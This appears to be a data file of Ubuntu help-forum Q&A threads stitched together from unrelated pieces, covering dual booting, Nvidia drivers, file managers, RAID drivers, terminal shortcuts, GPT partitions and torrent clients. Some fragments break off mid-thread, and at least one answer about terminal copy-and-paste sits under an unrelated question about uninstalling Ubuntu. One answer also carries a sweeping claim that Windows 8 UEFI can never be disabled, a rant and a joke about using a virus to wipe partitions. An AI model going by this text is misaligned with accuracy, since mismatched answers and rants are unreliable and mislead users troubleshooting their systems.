But if you try to install windows after installing ubuntu, windows installer will format your hard drive so you will loose your ubuntu installation.\nThere is a way to do it, anyhow, but is not easy and you will need a different physical hard disk. If your computer does not support more than one hard disk (most laptops don't) you won't get it working.\nI've done it a long time ago, so I can't remember every step, but it should be something like this:\n\n\n*\n\n*First replace your hard disk with the one you want to install windows on.\n\n*Install Windows on that hard drive.\n\n*When you have done the new installation, put the old Ubuntu hard disk back where it was.\n\n*Connect the hard disk where you have just installed windows in the secondary hard disk  slot of your motherboard.\nAnd that's it. If everything went ok, GRUB should recognize the new Windows installation, so you can choose it when you turn on your computer.\nI hope that helps.\n", "Q: Uninstalling dual boot Ubuntu 12.04 LTS with Windows 7 \nPossible Duplicate:\nHow to remove Ubuntu and put Windows back on?\nHow to uninstall Ubuntu from a dual boot system? \n\nI tried Ubuntu and decided Windows 7 was good enough for me.I tried to uninstall it but in Disk Management in Windows 7, I can't find the partition for Ubuntu.

I haven't been able to find one.\nAny help would be appreciated.\n\nA: Most of the terminals seem to use copy on select and middle-button to paste selection, or emulated middle-button to paste (using both mouse buttons at once).   This is typical Unix behavior, and the emulation is the updated usage required by Microsoft-type mice with only two buttons or two buttons and a scrollwheel.\nThe mouse buttons could be remapped with xinput or other means.

I use either, depending on how keyboard- or mouse- centric the task is. \nSecureCRT also supports pre-configured login (scripts), multiple sessions (tabs/windows), and full scripting (extensibility).  I find that when doing a lot of remote support, across multiple sites, these extra features are critical.\nI have used it for years on Windows (or under Ubuntu + Wine), but it was ported to Linux in early 2011.

Also it maintain a shadowing page table (I'm assuming it uses struct page_info to maintain this. Am I correct? If not can anyone explain?) which I wish to access because I need to traverse that list checking whether the guest to which this page is assigned has atleast accessed it once.\nCan anyone explain me how I can acheive this?\n\nA: Ravi,\nTo answer your question, I am assuming you want to modify the hypervisor source code and that you are an experienced Linux kernel coder. If you do not have experience with kernel coding, then you should probably first try a simpler kernel coding project to gain some experience. Explaining how to modify the Xen shadow memory code is beyond the scope of AskUbuntu. The answer will certainly not fit one of these replies. What you want to do is  very complicated.\nFirst of all, struct page_info is not a list. It is a building block abstract data type that is used in more than one list in the Xen hypervisor. So please tell us which list you are looking at that uses page_info.\nAs you have already seen, there is a reference count in a page_info structure, but it cannot be used to directly to do what you want, AFAIK. The back pointer _domain that you see as part of the page_info struct is only defined for pages not being used as shadow pages.\nXen can be configured to do what you say, allocate all memory when the guest is started, but it can also be configured to use ballooning and allocate memory later, both up and down. To learn about balloon driver and this kind of memory allocation, see the Xen wiki at http://wiki.xen.org/wiki/Main_Page.\nThere is also a feature called transcendental memory, referred to as \"tmem\" in the source. If configured to use tmem, Xen will take memory away from a guest that is not using it, to give it to another guest that needs it more. So there is more work if you want to modify the Xen hypervisor to track guest access of all shadow memory, running in all possible memory management modes.\nIf you are not kernel coding but just trouble shooting, you can connect a serial terminal to the hardware that is running Xen (see the Xen wiki for how to do that) to see memory usage. Once you have the serial terminal running correctly you can not only talk to dom0 but by hitting Ctrl-A 3 times, you can talk to the hypervisor directly.

Plus web-surfing on Firefox is actually lightning fast (much more than Windows), so I suspect there might be something wrong with the graphics driver (mine is GeForce 7050).\nI checked around System Settings and found an option to update the Nvidia driver. So I tried it and restarted, as instructed. \nNow, I got into a big problem upon restart... as the login-screen windows (where I have to type in the password) would take several attempts to display and finally did not manage to (it'd freeze for several seconds before there's any movement again). The background screen also kept reloading several times too and at some point the screen turned black with pixelated color strips running on the bottom 1/3 of the screen, and after a long while the background screen would come up again. Eventually I'd manage to be able to access the desktop but the launcher, top menu bar and app windows border would not disappear.\nI searched around and found many other people have this similar problem after updating Nvidia driver too, and on some threads the suggestion is to use \"killall -u $USER\" in command line (it's the only thing among various online suggestions I could do, as at that point I could not access Terminal without the launcher - Ctrl-Alt-T doesn't work for me). So I did that and was able to access the desktop correctly again with launchee/menu by creating a new account. But I would still have the same problem if logging into my original account.\nSo I just finally tried upgrading to 12.10 and now can access my original account with fully-functional desktop - the launcher, menu and windows border are all back now.\nHowever, the problem with sluggishness still remains. And now I get scared of ever having to update the Nvidia driver again!\nI wonder if anyone knows what's the reason that updating the Nvidia driver is causing this problem and is there a way I can update it safely in the future? I'm still not sure how to solve the problem with the sluggishness too and not sure where else to look to find a solution.\n\nA: I use NVIDIA GeForce 7050pv and I faced the same problem as you do. For my knowledge you don't update your driver until knowing that version is stable and support your graphics card.

All of the \"proper\" solutions I tried doing didn't work very well. For instance, choosing the default in exo-preferred-applications didn't update the dash (or much else for that matter), changing .desktop files only worked sometimes (Dropbox still used nautilus), etc.\nThe simple solution that works for me in all cases without mucking with changing desktop files was to do the following two commands:\nsudo mv /usr/bin/nautilus /usr/bin/nautilus.bak\nsudo ln -s /usr/bin/pcmanfm /usr/bin/nautilus\n\nYou can of course replace /usr/bin/pcmanfm with /usr/bin/thunar, or whatever.\nEdit: If you also want to have a desktop, open /etc/xdg/autostart/nautilus-autostart.desktop and make the Exec line \nExec=nautilus --desktop\n\n\nA: I think the bottom method from the community entry on Default File Manager is very easy, and I just tested it for SpaceFM (feature-richer PcManFM fork).\nIn terminal, execute\n exo-preferred-applications\n\nThen move to the Utilities tab, and under File Manager, choose your weapon of choice.\n\nA: There are several ways to accomplish this.

From the relevant man page:\n\n The write utility allows you to communicate with other users, by copying\n lines from your terminal to theirs.\n\n When you run the write command, the user you are writing to gets a mes‐\n sage of the form:\n\n       Message from yourname@yourhost on yourtty at hh:mm ...\n\n Any further lines you enter will be copied to the specified user's termi‐\n nal.  If the other user wants to reply, they must run write as well.\n\n When you are done, type an end-of-file or interrupt character.  The other\n user will see the message ‘EOF’ indicating that the conversation is over.\n\n\nTo send to multiple users, look at the wall command:\n\n Wall displays the contents of file or, by default, its standard input, on\n the terminals of all currently logged in users. The command will cut over\n 79 character long lines to new lines. Short lines are white space padded\n to have 79 characters. The command will always put carriage return and\n new line at the end of each line.\n\n Only the super-user can write on the terminals of users who have chosen\n to deny messages or are using a program which automatically denies mes‐\n sages.\n\n\nAlso relevant is the mesg command:\n\n   Mesg  controls  the  access to your terminal by others.  It's typically\n   used to allow or disallow other users to write to  your  terminal  (see\n   write(1)).\n\n\n", "Q: EPSON PRINTER XP405WH I am trying to find a printer that will run with my Ubuntu 11.04 installation and, having just been to my local PCWorld store. (Wonder if this Epson printer will run with Ubuntu)\nI already have a Lexmark 1480 printer but there is no Ubuntu compatible for this printer so I need another one.\n\nA: HP probably has the best Ubuntu (in fact, Linux) support amongst all of the manufacturers. have a look at http://h10018.www1.hp.com/wwsolutions/linux/products/printing_imaging/\nYou should not need to install any drivers - just connect the HP printer over USB and let Ubuntu do its thing.\n", "Q: Monitor displays \"No VGA signal\" \"Check DVI cable\" after installing motherboard drivers I bought computer with all of the needed parts, got everything sorted out, installed windows 7 but my CD-ROM doesn't fit my motherboard.\nSo I had to download the driver manually and install it using USB disc.\nMy motherboard: ECS elitegroup H61H2-M2, I downloaded it's drivers, installed the BIOS map or something, and then the computer forced a reboot after it was complete, after the reboot my monitor just stopped working and displayed No VGA signal, No DVI cable I think I've just installed the wrong driver, well but how can I sort it out?\nThis is the driver I installed.\nOn the book, it tells me to install the drivers, without the driver it won't see the Internet connection cable.\nI'm 100% sure there is nothing wrong with the monitor or it's cables. it stopped working exactly after the reboot after the installation.\n\nA: UEFI or BIOS?\nI think that windows has been installed in bios mode (using ms-dos partition table) and when you have updated the bios and then installed motherboard drivers have enabled gpt (using efi partition table) and your hardware has not been signed.  So you can not boot because you have activated a new feature which is basically doing its job in preventing os starting. (i.e. bios has changed) Have you checked bios settings to load optimal defaults files and save and exit!?  Check bios flash instructions.\nSwitching any installation from efi to bios or bios to efi is well recorded problem. Different motherboard manufacturers use different mechanisms to try and achieve switchability.\nIt should be possible to recover windows if you can get the appropriate efi/boot files in to the right place.  After reading up here http://www.ecs.com.tw/ECSWebSite/Product/Product_Detail.aspx?DetailID=1228&CategoryID=1&MenuID=103&LanID=0 you should be able to get the relative information in order to check your BIOS settings are set appropriately.\nIt is recommended to get bios files directly from manufacturer.\nIt may be worth your while to confirm which bios file you installed and which bios file is being used.  POST screen at reboot should confirm which bios version is being used.  If you do not get POST screen try doing a clrcmos to reset bios back to version as motherboard left factory with. I had to adjust settings which are hidden in bios settings(check your mobo manual)-disabling logo and adjusting delay for checking harddrive are the settings that i changed in order for me to check which bios version is being used in order to help confirm flash was good on my new mobo.\nA fresh installation may also be an option after checking your BIOS settings!? \nYou could try booting a ubuntu 12.10 live session dvd to use boot-repair to check your current disk partition table and getting a boot info script which will point you in the right direction for getting things going.  Installing and running boot-repair recommended fix may even fix things for you to get booting again.  Using gparted (from ubuntu live cd)to make a new parttion table and edit partitions will make ready your hdd if a fresh install is decided on.(after making sure your bios settings are appropriately set but you have to decide EFI or BIOS first? - or auto!?)\nOne week ago i did not know what uefi was!?

After creating a RAID 5 within the RocketRAID BIOS using the 3 disks, I am attempting to install Ubuntu Server 12.04 on the array.  However, the installer is locking up during the Detecting hardware phase.\nSteps taken:\nI'm using the standard Ubuntu Server 12.04 64-bit installation CD.  In order to install the RocketRAID drivers so the installer can recognize the RAID array, I am using two driver packages from the HighPoint website.\n\n\n*\n\n*rr272x_1x-ubuntu-11.10-x86_64-v1.4.12.0502.tgz (Drivers for Ubuntu 11.10; latest Ubuntu specific drivers)\n\n*RR272x_1x-Linux-Src-v1.4-120424-1752.tar.gz (Linux open source driver, which require a build against a kernel)\n\n\nThe rr272x_1x-ubuntu-11.10-x86_64-v1.4.12.0502.tgz driver has a preinst.sh script that is meant to load the driver while the Ubuntu installer is \"Loading additional components\".  At that point, you use ALT + F2 to enter the console, mount the USB flash drive you have the driver package extracted to, and run the preinst.sh script.  This is unsuccessful \"as is\" because the drivers included in this package are for the Linux 3.0.0-12-(generic/server) kernel and 12.04 has the 3.2.0-29 kernel.\nTo workaround this problem, I used the open source drivers listed above to build a driver off the 3.2.0-29-generic kernel, which I have on a Ubuntu Server 12.04 VirtualBox VM.  I extracted the archive and navigated to ../rr272x_1x-linux-src-v1.4/product/rr272x/linux and ran a make against the 3.2.0-29-generic kernel as outlined in the open source driver README using the following sudo make KERNELDIR=/lib/modules/3.2.0-29-generic/build.  This successfully builds the following rr272x_1x.ko.\nI take the resulting driver and GZIP it into an archive that has the correct naming convention so the preinst.sh script will recognize it, rr272x_1x3.2.0-29-genericx86_64.ko.gz.  I then place it in the boot folder of the extracted rr272x_1x-ubuntu-11.10-x86_64-v1.4.12.0502.tgz package, which is where it is supposed to be.\nWhen launching into the console during the Ubuntu installation, this time the preinst.sh script runs successfully.  I then press ALT + F1 to go back to the installer and continue until I hit the \"Detecting hardware\" phase, which is where the whole operation locks up.\nI've tested the Ubuntu installation CD and it doesn't have any errors.  I've also attempted this process multiple times in case it was a one time lockup, but it continues to lock up in the same place.  Can anyone offer insight on what I may be doing incorrectly here?\nNOTE: The installer will progress past the detecting hardware phase if the RocketRAID drives are not loaded, so I know it is something with the driver causing the issue.\n\nA: Advice: don't use the RocketRAID in the first place - or at least not as more than a SATA controller.  For pretty much any conceivable setup, mdraid will thoroughly outperform it... and won't leave you dependent on a quirky proprietary setup, to boot.\n(I say this as someone who has actually used RocketRAID controllers for years, because they supported FreeBSD incredibly well and directly.  They don't do so well with Linux, though, and they just aren't very high performance.)\nIf you want some tips on how to set up your server using kernel raid (mdraid), feel free to come back with questions about that. :)\n\nA: Not true at all (Maybe as far as SATA goes) I great great performance on my 0, 1, 5, SAS arrays. If your looking for performance on a 10 array you should probably buy a better card. As far as I am concerned the 2720SGL is a great piece of HW as long as it does what you need. Have not had any issues what so ever. Highpoint also has very good support, any time I have dealt with them it has been top notch.\n", "Q: How to reset bash keyboard shortcuts? How can I reset the bash shell's Ctrl + C keyboard shortcut? I changed it a few months ago and can't seem to recover it.\n\nA: The Ctrl+C shortcut used to cancel processes in the terminal is not a bash shortcut, but relates to the tty, as it is a shortcut for one of the signals (SIGINT in this case) that can be sent to processes which are active in the terminal. As noted in this discussion by Wildplasser,\n\nIt is the terminal (driver) that intercepts the ^C and translates it to a signal sent to the attached process (which is the shell).\n\nFor more on how SIGINT and other POSIX signals are handled, see this in depth article. \nAs a note, Bash shortcuts like Ctrl+A (to move to the beginning of the line) and others are managed by the readline library; current bindings can be shown by bind -P; see man bash and man readline, or the Ubuntu manpages online. However, even if you also had Ctrl+C set using readline or in your .inputrc, the tty set Ctrl+C would still override it.\nHowever, you should check whether you have changed any keyboard shortcuts in gnome terminal. Go to the menu and click edit > keyboard shortcuts as if you have made one of those Ctrl+C that would override the tty Ctrl+C.\n\nTo check current tty bindings run stty -a, which lists, for example,\nintr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?;\nswtch = M-^?; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;\n\nIn order to clear the current binding for the interrupt signal (intr), first run: \nstty intr ^- and only then run stty intr ^C to reassign the shortcut.\nMake sure you use an upper case C, as this is very important. This is the way to reset the shortcut, but if this still doesn't work you may need to put stty intr ^C in a file and have it read at startup of the terminal, as I discuss in a related answer here.\nMore general information about Ctrl+C is available in these two Stackoverflow articles:\n\n\n*\n\n*why-linux-always-output-c-upon-pressing-of-ctrlc \n\n*how-does-ctrl-c-terminate-a-child-process\n\nA: To reassign the interrupt signal (or SIGINT), call the stty command along with the proper mapping arguments:\nstty intr ^c\n\nSource:\n\n\n*\n\n*Oreilly's Unix Power Tools - 5.8.

(Y/N): y\nGPT data structures destroyed! You may now partition the disk using fdisk or\nother utilities.\nBlank out MBR? (Y/N): y\n\n\nA: GPT is the GUID Partition Table, which is a method of defining partitions (not protection) on your computer. If Windows is complaining about your use of GPT, that means that the Windows installer has booted in BIOS mode rather than in (U)EFI mode. There are two ways to work around this problem:\n\n\n*\n\n*Boot the Windows installer in EFI mode. This might or might not be possible, depending on your computer. If it's new (sold in the last 6-12 months), it probably supports EFI-mode booting. To boot in EFI mode, you may need to fiddle with your firmware settings to enable EFI-mode booting. Sometimes hitting the button to get to the boot options when you boot will produce two options for booting your CD: one in BIOS (aka legacy) mode and the other in EFI mode.\n\n*Convert the hard disk to use MBR partitioning rather than GPT. You can do this with GPT fdisk (gdisk) by using its \"g\" option on the \"recovery & transformation\" menu. There are, however, a lot of caveats and details to such a conversion; see the GPT fdisk documentation for details. When you're done, Ubuntu will no longer boot; you'll need to re-install the boot loader. (You'll need to do this after installing Windows in BIOS mode anyhow, so you might as well put this off until after you install Windows.)\n\n\nEFI-mode booting with GPT is still very new and can be trouble-prone, but converting your partition table from GPT to MBR is also a rather risky endeavor. Thus, it's hard for me to say which approach is best. Of course, you might not even be able to boot your computer in EFI mode, so you might have to do it by converting your partition table.\nAn alternative to either approach is to run Windows from within VirtualBox or some other virtualization environment under Linux. This is simpler and safer, and it may be adequate for many purposes. It's most likely to be a problem if you want to run video-intensive games, if you need low-level access to the hardware, or if you have inadequate RAM to support a virtualized environment sufficient for your needs.\nWhichever approach you take (aside from a virtualized Windows), I strongly recommend you back up any important data first; mucking with partition tables is always risky.\nEdit: Zolar1's comments suggest the possibility that Ubuntu is installed in BIOS mode but using GPT. Installing Windows in EFI mode in this case will require one of two things:\n\n\n*\n\n*Converting Ubuntu to boot in EFI mode rather than in BIOS mode\n\n*Switching boot modes (EFI for Windows, BIOS for Linux)\n\n\nEither is possible. You can convert Ubuntu to boot in EFI mode by adding an EFI boot loader. There are several options, as described here. Ubuntu uses GRUB 2 as its EFI-mode boot loader by default, but IMHO this is a poor choice.\nSwitching between EFI-mode and BIOS-mode boots of the computer is usually awkward, but sometimes a boot options switch (accessible by pressing F8, F12, or some other key at boot time) can make this tolerable. Another options may be to install rEFInd, which is an EFI-mode boot manager that can (as of version 0.4.6) hand off the boot process to a BIOS-mode boot loader (or to an EFI boot loader).\n\nA: I am not sure the computer will let you. I have an ASUS K55a myself. Every time I want to install ANY version of Linux then try to go back into windows7, windows forces a R/R and then linux won't work.\nI found that you can run Linux from a CD/DVD or if you use Puppy on a flash drive.\nMaybe you could use a nice virus to delete all partitions ? LOL\nBut this link might be of help: \nhttp://www.virtualvcp.com/linux-technical-guides/125-clearing-a-guid-partition-table-gpt-in-linux\nHave you turned off the UEFI setting in BIOS? I think as long as that is turned on you might not be able to get rid of the partition and still have the computer work.\nPlease note: All new computers that come with Win8 are mandated to have the UEFI turned on all the time with no way to disable it. Gotta love microshaft's greed.\nIf everyone complained to the FTC.gov about the THEFT of your ability to use YOUR hardware and legally licensed software then perhaps they could step in and force the junk to allow dual booting with linux.\nI wonder how come someone in Linux just don't write their own UEFI that gives the option to allow dual booting and replace the one that microshaft forces upon everyone.\nRemember, you OWN the hardware. Microsoft has no right to tell you what you can do with it.\nMore on Linux - if I remove my hard drive with win7 on it and install an ssd drive, then turn off the UEI in bios, I can install linux with no problem.\nIt is when I try to add a windows 7 drive with uefi back in is when there is a problem. Win7 forces a R/R then linux won't boot.\nPerhaps Linux could make their own uefi that controls every thing like the grub bootloader did instead of having windows dictate what software and hardware you can install. Use the linux uefi first then if you choose windows, kick it to the windows C:partition.\nAnother idea would be to do something sililar to what puppy does. Puppy uses a fat 2 but inside that it makes an ext2 file system.\nNot pracicl for big files though.\nHow about linux using the UDF file system and write whatever file system the user wants into that system.\nI dunno. I guess I am rambling due to frustration here.\nI wonder if a direct disk access program would allow you to alter the gpt partition table?\nHere is another possible solution to your problem:\nhttp://www.linuxquestions.org/questions/linux-general-1/delete-gpt-partition-789112/\n\nA: Boot with a Ubuntu OS\n@partition wizard window \ndelete all partitions and click on total free space \nand click create new partition table.\n", "Q: How to recognize special function keys on keyboard I have a Microsoft Digital Media 3000 Keyboard.

If I download a torrent via Magnet Link, everything works fine, but if I download from that ALT, it doesn't.\nThe tracker will return OK and also return the List of Seeders and Leechers (each greater than 20), but no peers to download from are returned. Everything worked fine previous to the upgrade.\nFor testing purposes I downloaded KTorrent. The same occured there.\nI had Transmission running for as long as 10 hours and no success.\nMy port is open and even if the firewall is disabled, this still happens.\n\nA: It seems the best solution to your problem is to delete the ~/Library/Application Support/Transmission/Resume folder. I've looked at a few threads and everyone seems to have arrived at that answer. To see more information, look here.\n\nA: Make sure that the TCP port used by Transmission is open.\nPort settings are in Preferences/Network tab. You can get a list of open TCP ports by running:\n\n*\n\n*On modern systems: ss -lnt\n\n*On older systems: netstat -lnt.  It's now deprecated, but was relevant when the question was originally asked.  Also can still be installed if needed with the net-tools package.\n\nI picked port 51413 since port 51443 was closed (51443 was default for Transmission - in my case).\nMore information on the options used with netstat can be found in this Super User question\n\nA: Ok, easy first.\n\n\n*\n\n*Try is updating trackers and making sure your ports are open.\n\n*Try manually adding the torrent (explained below). If that doesn't work disable any block lists you may have set up (risky), and lastly you could allow unencrypted seeds and stuff like that (very risky).\n\n*Adding the torrent file manually. All clients have a way to add torrent, then either put in the infohash (listed on most torrent sites), or right click the Get Magnet link and copy the URL into the client.\n\n*Another thing to try is updating trackers after doing all of those things.\n\n*When all else fails, reinstall your torrent client.\n\nA: I'd say the problem might be with the tracker itself. It might be seeing the Transmission (and other linux based clients) as leechers.\nDid you try one of the big torrent clients like Vuze or uTorrent?\nIf that doesn't work, do you have some ports blocked on your ubuntu system that isn't blocked in Windows?\n\nA: Check \n\nTransmission->Preferences->Peers->Encryption\n\nor \n\nTransmission->Preferences->Peers->Blocklist\n\nto see if you are blocking the peers.\n\nA: I would encrypt transmission and enable in the connection tab the last checkbox that says something about discovering local pairs.\nI will also give you my personal opinion to install Ubuntu 13.10 and not just stick to Ubuntu 12.10 as you are quite behind and transmission gets updated :)\nPS: Always get the latest stable release as LTS and previous versions are for Enterprises and not Home users.\n", "Q: My computer can't connect to my WIFI I am incredibly new to using Linux of any kind. I'm trying this on my netbook just to learn what it is about, and I'm really struggling with getting it connected to the Wifi. \nI have just installed Ubuntu 12.0 on it. I've replaced Windows altogether so it's not a dual-boot or anything. I was able to connect using an Ethernet cable to get it up and running, but my Wifi just will not connect. Instead of the Wifi symbol I have a little computer monitor. \nIt behaves as if it is connected, but it does not let me use Firefox to browse anything at all.  I have been scouring forums and using the help in Ubuntu but it all looks very confusing to me, and I'm afraid of breaking something since I'm not sure what I am doing. \nDoes anyone have any help for me at all? I'm kind of at my wit's end...\n\nA: A list of reported issues with the Lenovo S10 can be found on the Ubuntu Wiki. According to that, you may install the restricted non-free drivers to make wireless function properly. \nYou can look at this answer for help installing Broadcom 43** drivers... Which is what I believe your netbook has (not sure, though).\n\nA: The Lenovo S10 netbook is listed as having: \"Wireless networking: Broadcom 802.11b/g Wi-Fi\".\nThis is older technology, and if the wireless network you are trying to connect to is set to 802.11n only, you may have trouble.\nNormally, though, the network manager program will at least let you see available networks.\nSounds like first of all you need to determine if the OS can see the hardware in the netbook.\nOpen a terminal (Accessories -> Terminal), and type and enter: \"ifconfig\".\nThis is a command which will display a list of devices in your netbook. What you are looking for is one on the left-hand side labeled \"wlan0\" or similar (shorthand for Wireless Local Area Network number 0). If you can see this, then this narrows it down to probably a driver issue, which can usually be fixed. If you cannot see anything indicating a wireless network device, then you may have to invest in a new plug-in USB wireless adapter which will almost certainly be recognised.\n", "Q: Download to USB stick I downloaded 12.10 and I'm trying to put it on a USB stick, but when I got it downloaded, it opened a disc burner.
